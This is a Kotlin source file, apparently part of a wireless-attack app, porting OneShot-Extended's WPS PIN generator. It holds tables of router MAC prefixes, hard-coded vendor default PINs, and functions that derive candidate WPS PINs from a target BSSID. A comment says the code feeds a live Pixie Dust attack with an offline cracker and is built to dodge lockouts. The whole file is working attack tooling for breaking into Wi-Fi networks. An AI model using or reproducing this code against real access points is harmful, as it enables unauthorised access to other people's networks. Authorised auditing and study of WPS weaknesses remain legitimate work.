package com.swp81x.nrsuite.core.wps

import java.util.Locale

/**
 * Port of OneShot-Extended's WPS PIN generator and OUI suggestion table.
 *
 * This produces one likely candidate from the target BSSID. The full
 * suggestion list remains available for diagnostics/manual selection, but
 * the live Pixie Dust flow should normally try only one generated candidate
 * before falling back to the offline cracker to avoid WPS lockouts.
 */
object WpsPinGenerator {
    data class Suggestion(val algorithmId: String, val name: String, val pin: String)

    private data class Algorithm(val name: String, val prefixes: List<String>)

    private val algorithms: Map<String, Algorithm> = linkedMapOf(
        "pin24" to Algorithm("24-bit PIN", listOf("04BF6D", "0E5D4E", "107BEF", "14A9E3", "28285D", "2A285D", "32B2DC", "381766", "404A03", "4E5D4E", "5067F0", "5CF4AB", "6A285D", "8E5D4E", "AA285D", "B0B2DC", "C86C87", "CC5D4E", "CE5D4E", "EA285D", "E243F6", "EC43F6", "EE43F6", "F2B2DC", "FCF528", "FEF528", "4C9EFF", "0014D1", "D8EB97", "1C7EE5", "84C9B2", "FC7516", "14D64D", "9094E4", "BCF685", "C4A81D", "00664B", "087A4C", "14B968", "2008ED", "346BD3", "4CEDDE", "786A89", "88E3AB", "D46E5C", "E8CD2D", "EC233D", "ECCB30", "F49FF3", "20CF30", "90E6BA", "E0CB4E", "D4BF7F4", "F8C091", "001CDF", "002275", "08863B", "00B00C", "081075", "C83A35", "0022F7", "001F1F", "00265B", "68B6CF", "788DF7", "BC1401", "202BC1", "308730", "5C4CA9", "62233D", "623CE4", "623DFF", "6253D4", "62559C", "626BD3", "627D5E", "6296BF", "62A8E4", "62B686", "62C06F", "62C61F", "62C714", "62CBA8", "62CDBE", "62E87B", "6416F0", "6A1D67", "6A233D", "6A3DFF", "6A53D4", "6A559C", "6A6BD3", "6A96BF", "6A7D5E", "6AA8E4", "6AC06F", "6AC61F", "6AC714", "6ACBA8", "6ACDBE", "6AD15E", "6AD167", "721D67", "72233D", "723CE4", "723DFF", "7253D4", "72559C", "726BD3", "727D5E", "7296BF", "72A8E4", "72C06F", "72C61F", "72C714", "72CBA8", "72CDBE", "72D15E", "72E87B", "0026CE", "9897D1", "E04136", "B246FC", "E24136", "00E020", "5CA39D", "D86CE9", "DC7144", "801F02", "E47CF9", "000CF6", "00A026", "A0F3C1", "647002", "B0487A", "F81A67", "F8D111", "34BA9A", "B4944E")),
        "pin28" to Algorithm("28-bit PIN", listOf("200BC7", "4846FB", "D46AA8", "F84ABF")),
        "pin32" to Algorithm("32-bit PIN", listOf("000726", "D8FEE3", "FC8B97", "1062EB", "1C5F2B", "48EE0C", "802689", "908D78", "E8CC18", "2CAB25", "10BF48", "14DAE9", "3085A9", "50465D", "5404A6", "C86000", "F46D04", "3085A9", "801F02")),
        "pinDLink" to Algorithm("D-Link PIN", listOf("14D64D", "1C7EE5", "28107B", "84C9B2", "A0AB1B", "B8A386", "C0A0BB", "CCB255", "FC7516", "0014D1", "D8EB97")),
        "pinDLink1" to Algorithm("D-Link PIN +1", listOf("0018E7", "00195B", "001CF0", "001E58", "002191", "0022B0", "002401", "00265A", "14D64D", "1C7EE5", "340804", "5CD998", "84C9B2", "B8A386", "C8BE19", "C8D3A3", "CCB255", "0014D1")),
        "pinASUS" to Algorithm("ASUS PIN", listOf("049226", "04D9F5", "08606E", "0862669", "107B44", "10BF48", "10C37B", "14DDA9", "1C872C", "1CB72C", "2C56DC", "2CFDA1", "305A3A", "382C4A", "38D547", "40167E", "50465D", "54A050", "6045CB", "60A44C", "704D7B", "74D02B", "7824AF", "88D7F6", "9C5C8E", "AC220B", "AC9E17", "B06EBF", "BCEE7B", "C860007", "D017C2", "D850E6", "E03F49", "F0795978", "F832E4", "00072624", "0008A1D3", "00177C", "001EA6", "00304FB", "00E04C0", "048D38", "081077", "081078", "081079", "083E5D", "10FEED3C", "181E78", "1C4419", "2420C7", "247F20", "2CAB25", "3085A98C", "3C1E04", "40F201", "44E9DD", "48EE0C", "5464D9", "54B80A", "587BE906", "60D1AA21", "64517E", "64D954", "6C198F", "6C7220", "6CFDB9", "78D99FD", "7C2664", "803F5DF6", "84A423", "88A6C6", "8C10D4", "8C882B00", "904D4A", "907282", "90F65290", "94FBB2", "A01B29", "A0F3C1E", "A8F7E00", "ACA213", "B85510", "B8EE0E", "BC3400", "BC9680", "C891F9", "D00ED90", "D084B0", "D8FEE3", "E4BEED", "E894F6F6", "EC1A5971", "EC4C4D", "F42853", "F43E61", "F46BEF", "F8AB05", "FC8B97", "7062B8", "78542E", "C0A0BB8C", "C412F5", "C4A81D", "E8CC18", "EC2280", "F8E903F4")),
        "pinAirocon" to Algorithm("Airocon Realtek", listOf("0007262F", "000B2B4A", "000EF4E7", "001333B", "00177C", "001AEF", "00E04BB3", "02101801", "0810734", "08107710", "1013EE0", "2CAB25C7", "788C54", "803F5DF6", "94FBB2", "BC9680", "F43E61", "FC8B97")),
        "pinEmpty" to Algorithm("Empty PIN", listOf("E46F13", "EC2280", "58D56E", "1062EB", "10BEF5", "1C5F2B", "802689", "A0AB1B", "74DADA", "9CD643", "68A0F6", "0C96BF", "20F3A3", "ACE215", "C8D15E", "000E8F", "D42122", "3C9872", "788102", "7894B4", "D460E3", "E06066", "004A77", "2C957F", "64136C", "74A78E", "88D274", "702E22", "74B57E", "789682", "7C3953", "8C68C8", "D476EA", "344DEA", "38D82F", "54BE53", "709F2D", "94A7B7", "981333", "CAA366", "D0608C")),
        "pinCisco" to Algorithm("Cisco", listOf("001A2B", "00248C", "002618", "344DEB", "7071BC", "E06995", "E0CB4E", "7054F5")),
        "pinBrcm1" to Algorithm("Broadcom 1", listOf("ACF1DF", "BCF685", "C8D3A3", "988B5D", "001AA9", "14144B", "EC6264")),
        "pinBrcm2" to Algorithm("Broadcom 2", listOf("14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685", "C8BE19")),
        "pinBrcm3" to Algorithm("Broadcom 3", listOf("14D64D", "1C7EE5", "28107B", "B8A386", "BCF685", "C8BE19", "7C034C")),
        "pinBrcm4" to Algorithm("Broadcom 4", listOf("14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685", "C8BE19", "C8D3A3", "CCB255", "FC7516", "204E7F", "4C17EB", "18622C", "7C03D8", "D86CE9")),
        "pinBrcm5" to Algorithm("Broadcom 5", listOf("14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685", "C8BE19", "C8D3A3", "CCB255", "FC7516", "204E7F", "4C17EB", "18622C", "7C03D8", "D86CE9")),
        "pinBrcm6" to Algorithm("Broadcom 6", listOf("14D64D", "1C7EE5", "28107B", "84C9B2", "B8A386", "BCF685", "C8BE19", "C8D3A3", "CCB255", "FC7516", "204E7F", "4C17EB", "18622C", "7C03D8", "D86CE9")),
        "pinAirc1" to Algorithm("Airocon 1", listOf("181E78", "40F201", "44E9DD", "D084B0")),
        "pinAirc2" to Algorithm("Airocon 2", listOf("84A423", "8C10D4", "88A6C6")),
        "pinDSL2740R" to Algorithm("DSL-2740R", listOf("00265A", "1CBDB9", "340804", "5CD998", "84C9B2", "FC7516")),
        "pinRealtek1" to Algorithm("Realtek 1", listOf("0014D1", "000C42", "000EE8")),
        "pinRealtek2" to Algorithm("Realtek 2", listOf("007263", "E4BEED")),
        "pinRealtek3" to Algorithm("Realtek 3", listOf("08C6B3")),
        "pinUpvel" to Algorithm("Upvel", listOf("784476", "D4BF7F0", "F8C091")),
        "pinUR814AC" to Algorithm("UR-814AC", listOf("D4BF7F60")),
        "pinUR825AC" to Algorithm("UR-825AC", listOf("D4BF7F5")),
        "pinOnlime" to Algorithm("Onlime", listOf("D4BF7F", "F8C091", "144D67", "784476", "0014D1")),
        "pinEdimax" to Algorithm("Edimax", listOf("801F02", "00E04C")),
        "pinThomson" to Algorithm("Thomson", listOf("002624", "4432C8", "88F7C7", "CC03FA")),
        "pinHG532x" to Algorithm("HG532x", listOf("00664B", "086361", "087A4C", "0C96BF", "14B968", "2008ED", "2469A5", "346BD3", "786A89", "88E3AB", "9CC172", "ACE215", "D07AB5", "CCA223", "E8CD2D", "F80113", "F83DFF")),
        "pinH108L" to Algorithm("H108L", listOf("4C09B4", "4CAC0A", "84742A4", "9CD24B", "B075D5", "C864C7", "DC028E", "FCC897")),
        "pinONO" to Algorithm("CBN ONO", listOf("5C353B", "DC537C")),
    )

    private val staticPins: Map<String, Int> = mapOf(
        "pinCisco" to 1234567,
        "pinBrcm1" to 2017252,
        "pinBrcm2" to 4626484,
        "pinBrcm3" to 7622990,
        "pinBrcm4" to 6232714,
        "pinBrcm5" to 1086411,
        "pinBrcm6" to 3195719,
        "pinAirc1" to 3043203,
        "pinAirc2" to 7141225,
        "pinDSL2740R" to 6817554,
        "pinRealtek1" to 9566146,
        "pinRealtek2" to 9571911,
        "pinRealtek3" to 4856371,
        "pinUpvel" to 2085483,
        "pinUR814AC" to 4397768,
        "pinUR825AC" to 529417,
        "pinOnlime" to 9995604,
        "pinEdimax" to 3561153,
        "pinThomson" to 6795814,
        "pinHG532x" to 3425928,
        "pinH108L" to 9422988,
        "pinONO" to 9575521,
    )

    fun getSuggestedPins(bssid: String): List<Suggestion> {
        val normalized = normalizeBssid(bssid)
        return algorithms.mapNotNull { (id, algorithm) ->
            if (algorithm.prefixes.any { normalized.startsWith(it) }) {
                Suggestion(id, algorithm.name, generatePin(id, bssid) ?: return@mapNotNull null)
            } else {
                null
            }
        }
    }

    fun getLikely(bssid: String): String? = getSuggestedPins(bssid).firstOrNull()?.pin

    fun generatePin(algorithmId: String, bssid: String): String? {
        val mac = macToLong(bssid) ?: return null
        val raw = when (algorithmId) {
            "pinEmpty" -> return ""
            "pin24" -> mac and 0xFFFFFFL
            "pin28" -> mac and 0xFFFFFFFL
            "pin32" -> mac % 0x100000000L
            "pinDLink" -> pinDLink(mac)
            "pinDLink1" -> pinDLink((mac + 1L) and 0xFFFFFFFFFFFFL)
            "pinASUS" -> pinAsus(bssid)
            "pinAirocon" -> pinAirocon(bssid)
            else -> staticPins[algorithmId]?.toLong()
        } ?: return null
        val pinValue = (raw % 10_000_000L).toInt()
        val pin = pinValue.toString() + checksum(pinValue).toString()
        return pin.padStart(8, '0')
    }

    fun checksum(pin: Int): Int {
        var value = pin
        var accumulator = 0
        while (value != 0) {
            accumulator += 3 * (value % 10)
            value /= 10
            accumulator += value % 10
            value /= 10
        }
        return (10 - accumulator % 10) % 10
    }

    private fun pinDLink(mac: Long): Long {
        val nic = mac and 0xFFFFFFL
        var pin = nic xor 0x55AA55L
        pin = pin xor (
            ((pin and 0xFL) shl 4) +
                ((pin and 0xFL) shl 8) +
                ((pin and 0xFL) shl 12) +
                ((pin and 0xFL) shl 16) +
                ((pin and 0xFL) shl 20)
            )
        pin %= 10_000_000L
        if (pin < 1_000_000L) {
            pin += ((pin % 9L) * 1_000_000L) + 1_000_000L
        }
        return pin
    }

    private fun pinAsus(bssid: String): Long? {
        val bytes = macBytes(bssid) ?: return null
        val builder = StringBuilder(7)
        for (index in 0 until 7) {
            val divisor = 10 - (index + bytes[1] + bytes[2] + bytes[3] + bytes[4] + bytes[5]) % 7
            builder.append((bytes[index % 6] + bytes[5]) % divisor)
        }
        return builder.toString().toLongOrNull()
    }

    private fun pinAirocon(bssid: String): Long? {
        val b = macBytes(bssid) ?: return null
        return ((b[0] + b[1]) % 10).toLong() +
            (((b[5] + b[0]) % 10).toLong() * 10) +
            (((b[4] + b[5]) % 10).toLong() * 100) +
            (((b[3] + b[4]) % 10).toLong() * 1_000) +
            (((b[2] + b[3]) % 10).toLong() * 10_000) +
            (((b[1] + b[2]) % 10).toLong() * 100_000) +
            (((b[0] + b[1]) % 10).toLong() * 1_000_000)
    }

    private fun normalizeBssid(bssid: String): String =
        bssid.replace(":", "").replace("-", "").replace(".", "").uppercase(Locale.US)

    private fun macToLong(bssid: String): Long? =
        normalizeBssid(bssid).takeIf { it.length == 12 }?.toLongOrNull(16)

    private fun macBytes(bssid: String): IntArray? {
        val normalized = normalizeBssid(bssid)
        if (normalized.length != 12) return null
        return IntArray(6) { index ->
            normalized.substring(index * 2, index * 2 + 2).toInt(16)
        }
    }
}
